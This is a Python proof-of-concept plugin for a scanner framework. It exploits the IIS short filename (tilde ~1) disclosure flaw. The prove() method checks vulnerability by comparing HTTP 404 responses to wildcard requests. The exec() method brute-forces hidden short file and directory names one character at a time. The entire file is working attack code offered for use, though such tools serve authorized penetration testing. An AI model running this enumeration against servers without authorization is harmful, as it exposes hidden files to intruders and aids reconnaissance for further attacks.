#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import queue
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'iis short file'
        self.keyword = ['iis']
        self.info = 'iis short file'
        self.type = 'info'
        self.level = 'medium'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            status_1 = self._get_status(self.base_url+ '/*~1*/a.aspx') # an existed file/folder
            status_2 = self._get_status(self.base_url + '/l1j1e*~1*/a.aspx') # not existed file/folder
            if status_1 == 404 and status_2 != 404:
                self.flag = 1
                self.req.append({"url": self.base_url+ '/*~1*/a.aspx'})
                self.res.append({"info": '/*~1*/a.aspx', "key": 'iis_short_file'})

    def exec(self):
        self.get_url()
        if self.base_url:
            q = queue.Queue()
            alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
            path = self.base_url if self.base_url[-1] == '/' else  self.base_url + '/'
            for c in alphanum:
                q.put( (path + c, '.*') )    # filename, extension
            while True:
                if q.qsize() <= 0:
                    break
                url, ext = q.get(timeout=1.0)
                status = self._get_status(url + '*~1' + ext + '/1.aspx')
                if status == 404:
                    if len(url) - len(path) < 6:  # enum first 6 chars only
                        for c in alphanum:
                            q.put((url + c, ext))
                    else:
                        if ext == '.*':
                            q.put((url, ''))

                        if ext == '':
                            self.flag = 1
                            self.res.append({"info": url + '~1', "key": 'iis_short_file for Dir'})

                        elif len(ext) == 5 or (not ext.endswith('*')):  # .asp*
                            self.flag = 1
                            self.res.append({"info":  url + '~1' + ext, "key": 'iis_short_file for File'})

                        else:
                            for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
                                q.put((url, ext[:-1] + c + '*'))
                                if len(ext) < 4:  # < len('.as*')
                                    q.put((url, ext[:-1] + c))

    def _get_status(self,url):
        try:
            res = self.curl('get',url).status_code
        except:
            res = 0
        return res
